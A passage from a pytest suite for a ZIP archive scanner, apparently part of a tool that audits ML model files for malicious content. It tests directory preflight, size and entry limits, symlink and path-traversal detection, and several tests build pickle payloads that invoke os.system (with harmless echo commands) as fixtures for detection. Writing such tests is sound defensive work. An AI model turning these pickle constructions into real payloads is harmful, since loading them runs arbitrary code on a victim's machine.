        archive_path.write_bytes(archive_path.read_bytes() + b"benign trailer PK\x03\x04 not a local record")

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_local_entry_candidate_payload_validation_has_total_work_budget(self) -> None:
        payload = bytearray(4 * 1024 * 1024)
        candidate_payload_size = 2 * 1024 * 1024
        for offset in range(0, 128 * 32, 32):
            header = bytearray(30)
            header[0:4] = b"PK\x03\x04"
            header[4:6] = (20).to_bytes(2, "little")
            header[18:22] = candidate_payload_size.to_bytes(4, "little")
            header[22:26] = candidate_payload_size.to_bytes(4, "little")
            header[26:28] = (1).to_bytes(2, "little")
            payload[offset : offset + 30] = header
            payload[offset + 30] = ord("x")

        class ReadTrackingBuffer(io.BytesIO):
            bytes_read = 0

            def read(self, size: int | None = -1) -> bytes:
                data = super().read(size)
                self.bytes_read += len(data)
                return data

        handle = ReadTrackingBuffer(payload)
        with pytest.raises(zip_scanner_module._InvalidZipDirectory, match="bounded work budget"):
            ZipScanner._has_unreferenced_local_entry_ending_at(handle, len(payload))

        assert handle.bytes_read < 64 * 1024 * 1024

    def test_local_entry_data_descriptor_search_has_total_work_budget(self) -> None:
        streamed_header = bytearray(30)
        streamed_header[0:4] = b"PK\x03\x04"
        streamed_header[4:6] = (20).to_bytes(2, "little")
        streamed_header[6:8] = (0x0008).to_bytes(2, "little")
        streamed_header[26:28] = (1).to_bytes(2, "little")
        candidate = bytes(streamed_header) + b"x"
        payload = candidate * 250

        with pytest.raises(zip_scanner_module._InvalidZipDirectory, match=r"descriptor search.*bounded work budget"):
            ZipScanner._has_unreferenced_local_entry_ending_at(io.BytesIO(payload), len(payload))

    def test_appended_empty_eocd_cannot_hide_invalid_real_directory(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "appended_empty_hides_invalid.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')

        archive_bytes = bytearray(archive_path.read_bytes())
        real_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert real_eocd_index >= 0
        archive_bytes[real_eocd_index + 8 : real_eocd_index + 10] = (2).to_bytes(2, "little")
        archive_bytes[real_eocd_index + 10 : real_eocd_index + 12] = (2).to_bytes(2, "little")
        archive_bytes.extend(b"PK\x05\x06" + (b"\x00" * 18))
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("invalid real directories must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_eocd_shaped_stored_member_content_is_not_treated_as_ambiguous(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "benign_member_signature.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("signature.bin", b"PK\x05\x06" + (b"\x00" * 18))

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(check.name == "ZIP Central Directory Preflight" for check in result.checks)
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["entries"] == 1
            for check in result.checks
        )

    def test_stored_nested_zip_eocd_is_not_treated_as_top_level_ambiguity(self, tmp_path: Path) -> None:
        inner_archive = io.BytesIO()
        with zipfile.ZipFile(inner_archive, "w") as archive:
            archive.writestr("note.txt", "safe")

        archive_path = tmp_path / "stored_nested.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("nested.bin", inner_archive.getvalue())

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_symlink_local_metadata_mismatch_reports_critical_finding(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "mismatched-symlink-name.zip"
        link_name = "link.txt"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo(link_name)
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "safe-target")

        with zipfile.ZipFile(archive_path) as archive:
            header_offset = archive.getinfo(link_name).header_offset
        archive_bytes = bytearray(archive_path.read_bytes())
        filename_length = struct.unpack_from("<H", archive_bytes, header_offset + 26)[0]
        filename_start = header_offset + 30
        archive_bytes[filename_start : filename_start + filename_length] = b"x" * filename_length
        archive_path.write_bytes(archive_bytes)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(check.rule_code == "S902" for check in result.checks)
        symlink_check = next(
            check
            for check in result.checks
            if check.name == "Symlink Safety Validation" and check.details.get("entry") == link_name
        )
        assert symlink_check.status == CheckStatus.FAILED
        assert symlink_check.severity == IssueSeverity.CRITICAL
        assert symlink_check.rule_code == "S406"
        assert symlink_check.details["target_class"] == "invalid"

    def test_many_eocd_signatures_in_stored_member_are_not_treated_as_candidates(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "many_eocd_signatures.zip"
        payload = (b"PK\x05\x06" + (b"A" * 16) + b"\x00\x00") * 16
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("payload.bin", payload)

        result = ZipScanner(config={ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["payload.bin"]}).scan(
            str(archive_path)
        )

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_scan_reuses_preflight_file_handle_for_zipfile(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "same_handle.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        original_zipfile = zipfile.ZipFile
        opened_with_handle = False

        def capture_zipfile(file: Any, *args: Any, **kwargs: Any) -> zipfile.ZipFile:
            nonlocal opened_with_handle
            opened_with_handle = not isinstance(file, (str, bytes, os.PathLike))
            return original_zipfile(file, *args, **kwargs)

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", capture_zipfile)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert opened_with_handle is True

    def test_owned_archive_handle_closes_when_consumer_raises(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "owned_handle.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        opened_handle: Any = None
        try:
            with ZipScanner._open_archive_handle(str(archive_path), None) as handle:
                opened_handle = handle
                raise RuntimeError("stop scan")
        except RuntimeError as exc:
            assert str(exc) == "stop scan"

        assert opened_handle is not None
        assert opened_handle.closed is True

    def test_max_entries_limit_zip64_preflight_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """ZIP64 EOCD counts should also enforce the cap before central-directory parsing."""
        archive_path = tmp_path / "zip64_many_entries.zip"
        central_directory_parts: list[bytes] = []
        for name in (b"one", b"two", b"three"):
            header = bytearray(46)
            header[0:4] = b"PK\x01\x02"
            header[28:30] = len(name).to_bytes(2, "little")
            central_directory_parts.append(bytes(header) + name)
        central_directory = b"".join(central_directory_parts)
        zip64_eocd_offset = len(central_directory)
        zip64_eocd = bytearray(56)
        zip64_eocd[0:4] = b"PK\x06\x06"
        zip64_eocd[4:12] = (44).to_bytes(8, "little")
        zip64_eocd[24:32] = (3).to_bytes(8, "little")
        zip64_eocd[32:40] = (3).to_bytes(8, "little")
        zip64_eocd[40:48] = len(central_directory).to_bytes(8, "little")
        zip64_eocd[48:56] = (0).to_bytes(8, "little")
        locator = bytearray(20)
        locator[0:4] = b"PK\x06\x07"
        locator[8:16] = zip64_eocd_offset.to_bytes(8, "little")
        locator[16:20] = (1).to_bytes(4, "little")
        eocd = bytearray(22)
        eocd[0:4] = b"PK\x05\x06"
        eocd[8:10] = (0xFFFF).to_bytes(2, "little")
        eocd[10:12] = (0xFFFF).to_bytes(2, "little")
        eocd[12:16] = (0xFFFFFFFF).to_bytes(4, "little")
        eocd[16:20] = (0xFFFFFFFF).to_bytes(4, "little")
        archive_path.write_bytes(central_directory + zip64_eocd + locator + eocd)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("ZIP64 entry-count preflight should stop before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner(config={"max_zip_entries": 2}).scan(str(archive_path))

        assert result.success is False
        assert result.metadata["zip_entry_count_preflight"] == 3
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and check.details["entries"] == 3
            and check.details["entry_count_source"] == "central_directory_preflight"
            for check in result.checks
        )

    def test_valid_small_zip64_at_exact_limit_still_scans(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "small_zip64.zip"
        monkeypatch.setattr(zipfile, "ZIP64_LIMIT", 0)
        with zipfile.ZipFile(archive_path, "w", allowZip64=True) as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        result = ZipScanner(config={"max_zip_entries": 2}).scan(str(archive_path))

        assert result.success is True
        assert result.metadata["zip_entry_count_preflight"] == 2
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["entry_count_source"] == "central_directory_preflight"
            for check in result.checks
        )

    def test_max_entries_limit_post_open_fallback_rejects_when_preflight_unavailable(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """If EOCD preflight cannot determine a count, the post-open cap still fails closed."""
        archive_path = tmp_path / "fallback_many_entries.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        scanner = ZipScanner(config={"max_zip_entries": 1})
        monkeypatch.setattr(
            scanner,
            "_preflight_zip_directory",
            lambda _handle, _max_entries, _max_directory_size: None,
        )

        result = scanner.scan(str(archive_path))

        assert result.success is False
        assert "zip_entry_count_preflight" not in result.metadata
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and check.details["entries"] == 2
            and check.details["entry_count_source"] == "post_open_fallback"
            for check in result.checks
        )

    def test_max_entries_exact_limit_still_scans_malicious_member(self, tmp_path: Path) -> None:
        """An archive at the entry cap should still inspect and report dangerous members."""
        archive_path = tmp_path / "exact_limit_malicious.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo exact limit"\ntR.')
            archive.writestr("notes.txt", "benign")

        result = ZipScanner(config={"max_zip_entries": 2}).scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["entries"] == 2
            and check.details["entry_count_source"] == "central_directory_preflight"
            for check in result.checks
        )
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "payload.pkl"
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        )

    def test_max_entries_exact_limit_benign_archive_succeeds(self, tmp_path: Path) -> None:
        """A benign archive exactly at the cap should not be treated as an entry-count bomb."""
        archive_path = tmp_path / "exact_limit_benign.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        result = ZipScanner(config={"max_zip_entries": 2}).scan(str(archive_path))

        assert result.success is True
        assert not result.has_errors
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["entries"] == 2
            and check.details["max_entries"] == 2
            for check in result.checks
        )

    def test_aggregate_size_limit_uses_public_scan_limits(self) -> None:
        """Public size limits should constrain ZIP aggregate extraction by default."""
        assert ZipScanner(config={"max_total_size": 12})._get_max_total_uncompressed_size() == 12
        assert ZipScanner(config={"max_file_size": 12})._get_max_total_uncompressed_size() == 12
        assert (
            ZipScanner(
                config={
                    "max_zip_total_uncompressed_size": 20,
                    "max_total_size": 12,
                }
            )._get_max_total_uncompressed_size()
            == 12
        )
        assert ZipScanner(config={"max_zip_total_uncompressed_size": 0})._get_max_total_uncompressed_size() == (
            ZipScanner.UNLIMITED_ARCHIVE_SIZE
        )
        assert (
            ZipScanner(
                config={
                    "max_zip_total_uncompressed_size": 0,
                    "max_total_size": 12,
                }
            )._get_max_total_uncompressed_size()
            == 12
        )

    def test_get_max_entry_size_uses_entry_limit_when_file_size_is_unlimited(self) -> None:
        """An unlimited top-level file-size config should not hide explicit ZIP entry limits."""
        assert ZipScanner(config={"max_file_size": 0, "max_entry_size": 128})._get_max_entry_size() == 128

    def test_aggregate_uncompressed_size_limit_fails_before_extraction(self, tmp_path: Path) -> None:
        """Small entries split across a ZIP should still be bounded by an aggregate budget."""
        archive_path = tmp_path / "split_budget.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.bin", b"A" * 8)
            archive.writestr("two.bin", b"B" * 8)

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("aggregate size preflight should stop before extracting members")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_entry_size": 8,
                "max_zip_total_uncompressed_size": 12,
            },
        ).scan(str(archive_path))

        assert result.success is False
        assert result.metadata["archive_uncompressed_size"] == 16
        assert result.metadata["max_zip_total_uncompressed_size"] == 12
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "ZIP Aggregate Size Limit Check"
            and check.status == CheckStatus.FAILED
            and check.details["archive_uncompressed_size"] == 16
            and check.details["max_zip_total_uncompressed_size"] == 12
            for check in result.checks
        )

    def test_aggregate_uncompressed_size_limit_preserves_traversal_findings(self, tmp_path: Path) -> None:
        """Oversized ZIPs should still report deterministic path metadata findings."""
        archive_path = tmp_path / "oversized_traversal.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("../evil.txt", b"x")
            archive.writestr("filler.bin", b"A" * 16)

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("aggregate size preflight should stop before extracting members")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_zip_total_uncompressed_size": 10,
            },
        ).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert result.metadata["archive_declared_uncompressed_size"] == 17
        assert result.metadata["archive_uncompressed_size"] == 16
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(issue.rule_code == "S405" and issue.details.get("entry") == "../evil.txt" for issue in result.issues)
        assert any(issue.rule_code == "S410" for issue in result.issues)

    def test_aggregate_uncompressed_size_limit_preserves_symlink_findings(self, tmp_path: Path) -> None:
        """Oversized ZIPs should still report deterministic unsafe symlink metadata."""
        archive_path = tmp_path / "oversized_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("link.txt")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "../outside.txt")
            archive.writestr("filler.bin", b"A" * 16)

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("aggregate size preflight should stop before extracting members")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_zip_total_uncompressed_size": 10,
            },
        ).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert result.metadata["archive_declared_uncompressed_size"] == 30
        assert result.metadata["archive_uncompressed_size"] == 16
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(issue.rule_code == "S406" and issue.details.get("entry") == "link.txt" for issue in result.issues)
        assert any(issue.rule_code == "S410" for issue in result.issues)

    def test_aggregate_uncompressed_size_limit_excludes_symlink_target_bytes(self, tmp_path: Path) -> None:
        """Symlink target strings should not count toward bytes the scanner extracts."""
        archive_path = tmp_path / "symlink_only.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("link.txt")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "safe-target.txt")

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("symlink entries should not be extracted")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_zip_total_uncompressed_size": 1,
            },
        ).scan(str(archive_path))

        assert result.success is True
        assert result.metadata["archive_declared_uncompressed_size"] == len("safe-target.txt")
        assert result.metadata["archive_uncompressed_size"] == 0
        assert any(
            check.name == "ZIP Aggregate Size Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["archive_uncompressed_size"] == 0
            for check in result.checks
        )

    def test_aggregate_uncompressed_size_limit_allows_near_match(self, tmp_path: Path) -> None:
        """Archives at the aggregate budget should continue through normal member scanning."""
        archive_path = tmp_path / "within_budget.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.bin", b"A" * 6)
            archive.writestr("two.bin", b"B" * 6)

        scanned_entries = 0

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nonlocal scanned_entries
            scanned_entries += 1
            nested_result = ScanResult(scanner_name="test_nested")
            nested_result.bytes_scanned = Path(path).stat().st_size
            nested_result.finish(success=True)
            return nested_result

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_entry_size": 8,
                "max_zip_total_uncompressed_size": 12,
            },
        ).scan(str(archive_path))

        assert result.success is True
        assert scanned_entries == 2
        assert result.metadata["archive_uncompressed_size"] == 12
        assert any(
            check.name == "ZIP Aggregate Size Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["archive_uncompressed_size"] == 12
            for check in result.checks
        )

    def test_core_zip_aggregate_limit_fails_closed_with_exit_code_and_cache(self, tmp_path: Path) -> None:
        """Aggregate ZIP truncation should expose success, exit-code, and cache semantics."""
        archive_path = tmp_path / "cached_split_budget.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.bin", b"A" * 8)
            archive.writestr("two.bin", b"B" * 8)

        config: dict[str, Any] = {
            "cache_enabled": True,
            "cache_dir": str(tmp_path / "scan-cache"),
            "max_zip_total_uncompressed_size": 12,
        }

        first_result = core.scan_model_directory_or_file(str(archive_path), **config)
        second_result = core.scan_model_directory_or_file(str(archive_path), **config)

        for audit_result in (first_result, second_result):
            metadata = audit_result.file_metadata[str(archive_path)]
            assert audit_result.success is False
            assert audit_result.has_errors is False
            assert core.determine_exit_code(audit_result) == 1
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert metadata["analysis_incomplete"] is True
            assert "zip_analysis_incomplete" in metadata["scan_outcome_reasons"]
            assert metadata["archive_uncompressed_size"] == 16
            assert any("ZIP total uncompressed size exceeds limit" in issue.message for issue in audit_result.issues)

    def test_core_zip_partial_nested_scan_without_findings_returns_exit_code_2(self, tmp_path: Path) -> None:
        """A failed nested ZIP member scan with no finding should stay inconclusive in aggregate output."""
        archive_path = tmp_path / "nested_failure.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("member.bin", b"payload")

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            nested_result = ScanResult(scanner_name="test_nested")
            nested_result.finish(success=False)
            return nested_result

        scan_kwargs: dict[str, Any] = {NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}
        audit_result = core.scan_model_directory_or_file(
            str(archive_path),
            cache_enabled=False,
            **scan_kwargs,
        )

        metadata = audit_result.file_metadata[str(archive_path)]
        assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert metadata["analysis_incomplete"] is True
        assert audit_result.success is False
        assert core.determine_exit_code(audit_result) == 2

    def test_core_zip_nested_scan_exception_without_findings_returns_exit_code_2(self, tmp_path: Path) -> None:
        """An unavailable nested member scan is incomplete coverage, not a finding."""
        archive_path = tmp_path / "nested_scan_exception.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("member.bin", b"ordinary member")

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise RuntimeError("nested scanner unavailable")

        scan_kwargs: dict[str, Any] = {NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}
        audit_result = core.scan_model_directory_or_file(
            str(archive_path),
            cache_enabled=False,
            **scan_kwargs,
        )

        metadata = audit_result.file_metadata[str(archive_path)]
        assert "zip_entry_scan_incomplete" in metadata["scan_outcome_reasons"]
        entry_issues = [issue for issue in audit_result.issues if issue.message.startswith("Error scanning ZIP entry")]
        assert len(entry_issues) == 1
        assert entry_issues[0].severity == IssueSeverity.INFO
        assert core.determine_exit_code(audit_result) == 2

    def test_nested_scan_exception_name_cannot_inherit_symlink_severity_override(self, tmp_path: Path) -> None:
        """Coverage gaps remain scan errors even when an entry name resembles a symlink signal."""
        archive_path = tmp_path / "nested_failure_named_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("symlink.txt", b"ordinary member")

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise RuntimeError("nested scanner unavailable")

        scan_kwargs: dict[str, Any] = {NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}
        set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
        try:
            result = ZipScanner(config=scan_kwargs).scan(str(archive_path))
            aggregate = core.scan_model_directory_or_file(
                str(archive_path),
                cache_enabled=False,
                **scan_kwargs,
            )
        finally:
            reset_config()

        entry_checks = [check for check in result.checks if check.name == "ZIP Entry Scan"]
        assert len(entry_checks) == 1
        assert entry_checks[0].rule_code == "S902"
        assert entry_checks[0].severity == IssueSeverity.INFO
        assert not any(check.rule_code == "S406" for check in result.checks)
        assert core.determine_exit_code(aggregate) == 2

    def test_zip_nested_critical_finding_does_not_mark_archive_incomplete(self, tmp_path: Path) -> None:
        """Real nested findings should fail the archive without claiming partial traversal."""
        archive_path = tmp_path / "nested_critical.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.pkl", b"payload")

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_result = ScanResult(scanner_name="test_nested")
            nested_result.add_check(
                name="Nested Critical Finding",
                passed=False,
                message="Nested member is malicious",
                severity=IssueSeverity.CRITICAL,
                location=path,
            )
            nested_result.finish(success=False)
            return nested_result

        result = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert "scan_outcome" not in result.metadata
        assert result.metadata.get("analysis_incomplete") is not True
        assert any(check.name == "Nested Critical Finding" for check in result.checks)

    def test_zip_incomplete_metadata_survives_cache_roundtrip(self, tmp_path: Path) -> None:
        """Cache conversion should preserve explicit partial-archive outcome metadata."""
        archive_path = tmp_path / "cached_many_entries.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        config = {
            "cache_enabled": True,
            "cache_dir": str(tmp_path / "scan-cache"),
            "max_zip_entries": 1,
        }

        first_result = core.scan_file(str(archive_path), config=config)
        second_result = core.scan_file(str(archive_path), config=config)

        assert first_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "zip_analysis_incomplete" in first_result.metadata["scan_outcome_reasons"]
        assert second_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "zip_analysis_incomplete" in second_result.metadata["scan_outcome_reasons"]

    def test_oversized_symlink_target_fails_closed(self, tmp_path: Path) -> None:
        """Symlink targets should be read with a bounded cap instead of being silently trusted."""
        import stat

        archive_path = tmp_path / "oversized_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("link.txt")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "a" * (ZipScanner.MAX_SYMLINK_TARGET_BYTES + 1))

        set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
        try:
            result = self.scanner.scan(str(archive_path))
        finally:
            reset_config()

        assert result.success is False
        symlink_checks = [
            check
            for check in result.checks
            if check.name == "Symlink Safety Validation" and check.status == CheckStatus.FAILED
        ]
        assert len(symlink_checks) == 1
        assert "symlink target exceeds maximum size" in symlink_checks[0].message.lower()
        assert symlink_checks[0].details.get("entry") == "link.txt"
        assert symlink_checks[0].rule_code == "S902"
        assert symlink_checks[0].severity == IssueSeverity.INFO
        assert not any(issue.rule_code == "S406" for issue in result.issues)
        assert "zip_symlink_target_read_incomplete" in result.metadata["scan_outcome_reasons"]
        _assert_inconclusive_zip_aggregate_not_cached(
            archive_path,
            "zip_symlink_target_read_incomplete",
            tmp_path / "symlink-cache",
        )

    def test_oversized_entry_cleanup_removes_partial_temp_file(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Entry extraction failures should not leave partial temp files behind."""
        scratch_dir = tmp_path / "scratch"
        scratch_dir.mkdir()
        monkeypatch.setattr(tempfile, "tempdir", str(scratch_dir))

        archive_path = tmp_path / "oversized_entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("big.bin", b"A" * 32)

        result = ZipScanner(config={"max_entry_size": 8}).scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Entry Scan"
            and check.status == CheckStatus.FAILED
            and "exceeds maximum size" in check.message
            and check.details.get("entry") == "big.bin"
            for check in result.checks
        )
        entry_checks = [check for check in result.checks if check.name == "ZIP Entry Scan"]
        assert len(entry_checks) == 1
        assert entry_checks[0].severity == IssueSeverity.INFO
        assert "zip_entry_scan_incomplete" in result.metadata["scan_outcome_reasons"]
        assert list(scratch_dir.iterdir()) == []

    def test_oversized_benign_zip_member_returns_inconclusive_exit_code(self, tmp_path: Path) -> None:
        """Skipped ordinary member content is incomplete coverage, not a security finding."""
        archive_path = tmp_path / "oversized_benign.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("notes.txt", b"ordinary metadata " * 10)

        result = core.scan_model_directory_or_file(
            str(archive_path),
            cache_scan_results=False,
            max_entry_size=64,
        )

        metadata = result.file_metadata[str(archive_path)]
        assert "zip_entry_scan_incomplete" in metadata["scan_outcome_reasons"]
        assert not [
            issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        ]
        assert core.determine_exit_code(result) == 2
        _assert_inconclusive_zip_aggregate_not_cached(
            archive_path,
            "zip_entry_scan_incomplete",
            tmp_path / "oversized-benign-cache",
            max_entry_size=64,
        )

    def test_oversized_hidden_zip_payload_returns_inconclusive_without_detected_finding(self, tmp_path: Path) -> None:
        """A payload hidden above the extraction cap must not be reported as observed."""
        archive_path = tmp_path / "oversized_hidden_payload.zip"
        payload = b'cos\nsystem\n(S"echo pwned"\ntR.' + (b"A" * 128)
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("payload.txt", payload)

        result = core.scan_model_directory_or_file(
            str(archive_path),
            cache_scan_results=False,
            max_entry_size=64,
        )

        metadata = result.file_metadata[str(archive_path)]
        assert "zip_entry_scan_incomplete" in metadata["scan_outcome_reasons"]
        assert not [
            issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        ]
        assert core.determine_exit_code(result) == 2
        _assert_inconclusive_zip_aggregate_not_cached(
            archive_path,
            "zip_entry_scan_incomplete",
            tmp_path / "oversized-hidden-cache",
            max_entry_size=64,
        )

    def test_detected_zip_payload_after_skipped_member_preserves_security_exit_code(self, tmp_path: Path) -> None:
        """Observed malicious content still wins over an informational coverage gap."""
        archive_path = tmp_path / "detected_after_skipped_member.zip"
        payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("large.txt", b"A" * 128)
            archive.writestr("payload.txt", payload)

        result = core.scan_model_directory_or_file(
            str(archive_path),
            cache_scan_results=False,
            max_entry_size=64,
        )

        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and any(symbol in issue.message.lower() for symbol in ("os.system", "posix.system"))
            for issue in result.issues
        )
        assert core.determine_exit_code(result) == 1

    def test_scan_zip_with_dangerous_pickle(self):
        """Test scanning a ZIP file containing a dangerous pickle"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                # Create a pickle with suspicious content
                import os as os_module
                import pickle

                class DangerousClass:
                    def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
                        return (os_module.system, ("echo pwned",))

                dangerous_obj = DangerousClass()
                pickle_data = pickle.dumps(dangerous_obj)
                z.writestr("dangerous.pkl", pickle_data)
            tmp_path = tmp.name

